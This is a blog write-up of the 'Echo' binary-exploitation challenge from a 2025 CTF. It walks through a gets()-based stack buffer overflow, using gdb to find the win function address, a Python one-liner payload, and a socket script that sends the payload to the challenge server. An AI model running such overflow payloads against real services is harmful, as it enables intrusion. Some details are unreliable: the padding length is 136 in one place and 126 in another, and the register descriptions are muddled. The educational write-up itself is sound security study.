<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A writeup for the Echo challenge from Synk Fetch the Flag 2025 CTF."><title>Echo</title><link rel=canonical href=https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="Echo"><meta property="og:description" content="A writeup for the Echo challenge from Synk Fetch the Flag 2025 CTF."><meta property="og:url" content="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/"><meta property="og:site_name" content="Song's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Synk"><meta property="article:tag" content="Fetch the Flag 2025"><meta property="article:tag" content="Binary Exploitation"><meta property="article:tag" content="Buffer Overflow"><meta property="article:published_time" content="2025-03-30T00:00:00+08:00"><meta property="article:modified_time" content="2025-03-30T00:00:00+08:00"><meta property="og:image" content="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25.png"><meta name=twitter:title content="Echo"><meta name=twitter:description content="A writeup for the Echo challenge from Synk Fetch the Flag 2025 CTF."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25.png"><link rel="shortcut icon" href=/favicon.svg></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu12ef359483bc258b4d0472d73331359c_69166_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>ðŸ“–</span></figure><div class=site-meta><h1 class=site-name><a href=/>Song's Blog</a></h1><h2 class=site-description>Studying</h2></div></header><ol class=social-menu><li><a href=https://github.com/XPH0816 target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://www.linkedin.com/in/lss0816/ target=_blank title=Linkedin rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="11" x2="8" y2="16"/><line x1="8" y1="8" x2="8" y2="8.01"/><line x1="12" y1="16" x2="12" y2="11"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></a></li><li><a href=/img/qrcode.png target=_blank title=WeChat rel=me><!doctype html><svg t="1676174392026" class="icon" viewBox="0 0 1194 1024" xmlns="http://www.w3.org/2000/svg" p-id="2999" xmlns:xlink="http://www.w3.org/1999/xlink" width="233.203125" height="200"><path d="M728.064 535.296a35.498667 35.498667.0 11-70.912.0 35.498667 35.498667.0 0170.912.0m246.016.0a35.498667 35.498667.0 11-70.997333.0 35.498667 35.498667.0 0170.997333.0" fill="#cdcdcd" p-id="3e3"/><path d="M902.144 930.133333l-6.656 1.450667a594.176 594.176.0 01-18.602667 3.669333c-26.453333 4.778667-44.629333 6.826667-64 6.144C645.034666 935.850666 514.218666 853.504 461.824 722.688a446.464 446.464.0 01-6.826667-19.114667l-1.962666-6.058666a199.68 199.68.0 01-3.84-13.653334 338.858667 338.858667.0 01-9.216-75.690666c0-171.008 157.013333-305.92 354.304-314.709334l8.874666-.682666c7.850667-.597333 12.970667-.853333 18.773334-.853334h14.762666l9.301334.170667c188.16 14.677333 340.394667 156.672 340.394666 323.925333.0 78.336-38.826667 155.733333-109.653333 222.293334a303.530667 303.530667.0 01-7.082667 6.4l9.984 71.082666a49.152 49.152.0 01-69.12 58.453334l-98.816-46.421334a582.485333 582.485333.0 01-9.472 2.304zm220.16-314.026666c0-131.754667-124.586667-247.978667-279.125333-260.096H821.930667c-3.754667.0-7.68.085333-13.994667.597333l-10.666667.768C631.466667 364.8 503.978667 474.453333 503.978667 608.256c0 18.773333 2.730667 40.874667 7.509333 60.842667.597333 2.474667 1.450667 5.632 2.56 9.216l1.706667 4.949333c2.133333 6.570667 4.266667 12.629333 5.632 15.957333 42.325333 105.728 149.930667 173.397333 293.717333 178.176 13.738667.512 28.16-1.109333 50.346667-5.12a531.626667 531.626667.0 0016.64-3.242666l5.632-1.28c4.693333-1.109333 8.448-1.962667 19.370666-4.778667a32 32 0 0121.418667 2.133333L1013.76 905.216l-9.984-69.290667a32 32 0 0113.909333-31.232c1.194667-.853333 8.618667-6.912 15.189334-13.056 58.709333-55.210667 89.429333-116.394667 89.429333-175.616zM12.970667 378.197333C12.970667 171.52 206.677333 5.376 442.709333 5.376c208.384.0 394.24 130.304 431.872 306.090667 1.28 5.973333 1.28 11.264.512 16.896a32 32 0 01-63.658666-5.973334C779.178667 179.2 621.482667 69.376 442.709333 69.376c-202.666666.0-365.738666 139.776-365.738666 308.906667.0 89.941333 46.165333 171.52 136.021333 237.568a32 32 0 0111.434667 35.84l-23.296 69.973333 104.96-48.896a32 32 0 0122.442666-1.706667l5.461334 1.706667c54.357333 11.093333 76.288 14.506667 108.714666 14.506667a200.789333 200.789333.0 0032.256-4.010667c-.512.170667-1.536.512-2.730666 1.536a33.109333 33.109333.0 0139.253333 1.109333A32 32 0 01516.864 730.88c-11.776 14.848-47.36 20.309333-74.24 20.309333-37.12.0-62.037333-3.584-119.893333-15.530666L198.570667 793.6a49.493333 49.493333.0 01-68.949334-59.733333l26.88-80.64c-93.525333-75.52-143.530666-170.24-143.530666-275.029334z" fill="#cdcdcd" p-id="3001"/><path d="M344.576 254.378667a44.373333 44.373333.0 11-88.746667.085333 44.373333 44.373333.0 0188.746667.0M636.586667 254.378667A44.373333 44.373333.0 11547.84 254.464a44.373333 44.373333.0 0188.746667.0" fill="#cdcdcd" p-id="3002"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/projects/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-stars" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M17.8 19.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L17.8 19.817z"/><path d="M6.2 19.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L6.2 19.817z"/><path d="M12 9.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L12 9.817z"/></svg><span>Projects</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://xph0816.github.io/ selected>English</option><option value=https://xph0816.github.io/zhcn/>ç®€ä½“ä¸­æ–‡</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#snapshot>Snapshot</a></li><li><a href=#writeup>Writeup</a></li><li><a href=#explanation-why-it-works>Explanation Why It Works</a><ol><li><a href=#buffer-overflow>Buffer Overflow</a></li></ol></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/synk-fetch-the-flag-2025-echo/><img src=/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25_hu1ae0a39953be00c3e82b0aa3ddef0f40_1280507_800x0_resize_box_3.png srcset="/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25_hu1ae0a39953be00c3e82b0aa3ddef0f40_1280507_800x0_resize_box_3.png 800w, /p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25_hu1ae0a39953be00c3e82b0aa3ddef0f40_1280507_1600x0_resize_box_3.png 1600w" width=800 height=419 loading=lazy alt="Featured image of post Echo"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf-writeup/ style=background-color:#2a9d8f;color:#fff>CTF Writeup</a>
<a href=/categories/synk-fetch-the-flag/ style=background-color:#2a9d8f;color:#fff>Synk Fetch The Flag</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/synk-fetch-the-flag-2025-echo/>Echo</a></h2><h3 class=article-subtitle>A writeup for the Echo challenge from Synk Fetch the Flag 2025 CTF.</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Mar 30, 2025</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><h2 id=snapshot>Snapshot</h2><p><img src=/p/synk-fetch-the-flag-2025-echo/banner.png width=616 height=318 srcset="/p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/banner_hu2e62f561e399a449beab975235cda75c_26225_1024x0_resize_box_3.png 1024w" loading=lazy alt="Challenge SnapShot" class=gallery-image data-flex-grow=193 data-flex-basis=464px></p><h2 id=writeup>Writeup</h2><p>I Start by downloading the binary and decompiling using online decompiler <a class=link href=https://binary.ninja/ target=_blank rel=noopener>Binary Ninja</a>. The Binary is a 64-bit ELF file. The decompiled code shows that the binary has a function called <code>echo</code> which takes a string as input and prints it to the console. The binary also has a function called <code>main</code> which calls the <code>echo</code> function with a hardcoded string.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/binary-ninja.png width=589 height=254 srcset="/p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/binary-ninja_hu133a6b41456b606b92bcb8e740a9c93c_15432_1024x0_resize_box_3.png 1024w" loading=lazy alt="Decompiled from binary ninja" class=gallery-image data-flex-grow=231 data-flex-basis=556px></p><p>Notice that the <code>main</code> function calls the <code>gets</code> function which can be exploited to perform a buffer overflow attack. The <code>gets</code> function does not check the length of the input string, which means that we can overflow the buffer and overwrite the return address of the <code>main</code> function. This allows us to execute arbitrary code.</p><p>I will use the <code>gdb</code> debugger to analyze the binary and find the address of the <code>win</code>function.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/gdb.png width=451 height=440 srcset="/p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/gdb_hud3dd94f7753eb481d75f41590ce088b0_77792_1024x0_resize_box_3.png 1024w" loading=lazy alt="GDB win function" class=gallery-image data-flex-grow=102 data-flex-basis=246px></p><p>then I use the python command to create a pattern of 137 bytes and then run the binary with that input to test the buffer overflow.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/python.png width=561 height=121 srcset="/p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/python_hu21a8a85ecef8458142f5b30e89d33d83_32885_1024x0_resize_box_3.png 1024w" loading=lazy alt="Try input string in python" class=gallery-image data-flex-grow=463 data-flex-basis=1112px></p><p>then I run the binary in <code>gdb</code> and check the stack to see if the return address has been overwritten.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/gdb-check-stack.png width=526 height=551 srcset="/p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/gdb-check-stack_hud2e268441d8a54ee6ae0d2c47196a090_96133_1024x0_resize_box_3.png 1024w" loading=lazy alt="GDB check stack" class=gallery-image data-flex-grow=95 data-flex-basis=229px></p><p>Notice that the rbp (x64 stack pointer) points has been overwritten with the address. So I try input another character to see if the return address which on rip (x64 stack pointer) has been overwritten.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2.png width=1426 height=647 srcset="/p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/gdb-check-stack-2_hufe60d77d97062bfaba572ac1ab8166d7_219750_1024x0_resize_box_3.png 1024w" loading=lazy alt="GDB check stack" class=gallery-image data-flex-grow=220 data-flex-basis=528px></p><p>I found that the return address has been written to 0x4242424242. So I use python to create a payload that will overwrite the return address with the address of the <code>win</code> function which is <code>0x0000000000401216</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;print &#34;A&#34;*136 + &#34;</span><span class=se>\x16\x12\x40\x00\x00\x00</span><span class=s1>&#34;&#39;</span> <span class=o>&gt;</span> <span class=n>payload</span><span class=o>.</span><span class=n>txt</span>
</span></span></code></pre></td></tr></table></div></div><p>Before running the binary, I make a fake <code>flag.txt</code> file to check if the binary is running the <code>win</code> function. The <code>win</code> function is supposed to read the flag from the <code>flag.txt</code> file and print it to the console.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;FTF{this_is_a_fake_flag}&#34;</span> &gt; flag.txt
</span></span></code></pre></td></tr></table></div></div><p>Then I run the binary with the payload and check the output.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./echo &lt; payload.txt
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack.png width=1391 height=91 srcset="/p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/buffer-overflow-attack_hu72cb7b622379e2d20752813bbf75a98b_31230_1024x0_resize_box_3.png 1024w" loading=lazy alt=buffer-overflow-attack class=gallery-image data-flex-grow=1528 data-flex-basis=3668px></p><p>Ta-da! I got the flag. The flag is <code>FTF{this_is_a_fake_flag}</code>.
The binary is vulnerable to buffer overflow attacks and can be exploited to execute arbitrary code. The <code>gets</code> function is the main vulnerability in this binary. It is important to always check the length of the input string when using functions like <code>gets</code> to prevent buffer overflow attacks.</p><p>Next, we create a script to exploit the binary on the server. The script will create a payload that will overwrite the return address with the address of the <code>win</code> function and then run the binary with the payload.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Sends the payload and receives the echoed text.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span> <span class=k>as</span> <span class=n>s</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Receive the initial prompt</span>
</span></span><span class=line><span class=cl>            <span class=n>prompt</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;latin-1&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span> <span class=c1># Or utf-8</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Received prompt: </span><span class=si>{</span><span class=n>prompt</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Send the payload</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=c1># Send a newline character, very important.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Receive the echoed text (and any other responses)</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;latin-1&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span> <span class=c1># Or utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Received response: </span><span class=si>{</span><span class=n>response</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ConnectionRefusedError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Connection refused to </span><span class=si>{</span><span class=n>host</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;An error occurred: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;challenge.ctf.games&#34;</span> <span class=c1># Replace with the actual host</span>
</span></span><span class=line><span class=cl>    <span class=n>port</span> <span class=o>=</span> <span class=mi>31084</span> <span class=c1># Replace with the actual port number</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mi>126</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x16\x12\x40\x00\x00\x00</span><span class=s2>&#34;</span>  <span class=c1># Your payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>and the flag will be printed on the console.
<code>flag{4f4293237e37d06d733772a087299f17}</code></p><h2 id=explanation-why-it-works>Explanation Why It Works</h2><p>The exploit works because the <code>gets</code> function does not check the length of the input string, which allows us to overflow the buffer and overwrite the return address of the <code>main</code> function. On the other hand, the compiler does not add any stack canaries or other protections to prevent buffer overflow attacks. This allows us to execute arbitrary code by overwriting the return address with the address of the <code>win</code> function.</p><h3 id=buffer-overflow>Buffer Overflow</h3><p>First of all, let&rsquo;s understand what a buffer overflow is. A buffer overflow occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory locations, including the return address of a function. When the function returns, it will jump to the overwritten address, which can lead to arbitrary code execution.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/buffer-overflow.png width=850 height=490 srcset="/p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_1024x0_resize_box_3.png 1024w" loading=lazy alt="Buffer Overflow Attack" class=gallery-image data-flex-grow=173 data-flex-basis=416px></p><p>In x86_64 architecture, the stack grows downwards, meaning that the higher memory addresses are at the top of the stack and the lower memory addresses are at the bottom. When a function is called, a new stack frame is created, and the return address is pushed onto the stack. If we overflow the buffer, we can overwrite the return address with our own address. In diagram below, we can see how the stack looks like before and after the overflow but is x86 architecture.</p><p><img src=/p/synk-fetch-the-flag-2025-echo/before-after.png width=1800 height=910 srcset="/p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_480x0_resize_box_3.png 480w, /p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_1024x0_resize_box_3.png 1024w" loading=lazy alt="Before Overflow VS After Overflow" class=gallery-image data-flex-grow=197 data-flex-basis=474px></p><p>X86_64 architecture is similar to x86 architecture but with some differences. In x86_64 architecture, the stack grows downwards, and the return address is stored in the <code>RIP</code> register. When the function returns, it jumps to the address stored in the <code>RIP</code> register. If we overflow the buffer and overwrite the return address with our own address, we can execute arbitrary code.</p><h2 id=references>References</h2><ul><li><a class=link href="https://ctf101.org/binary-exploitation/what-is-the-stack/#:~:text=The%20esp%20%2F%20rsp%20register%20holds,at%20that%20location%20in%20memory." target=_blank rel=noopener>The Stack</a></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a>
<a href=/tags/synk/>Synk</a>
<a href=/tags/fetch-the-flag-2025/>Fetch the Flag 2025</a>
<a href=/tags/binary-exploitation/>Binary Exploitation</a>
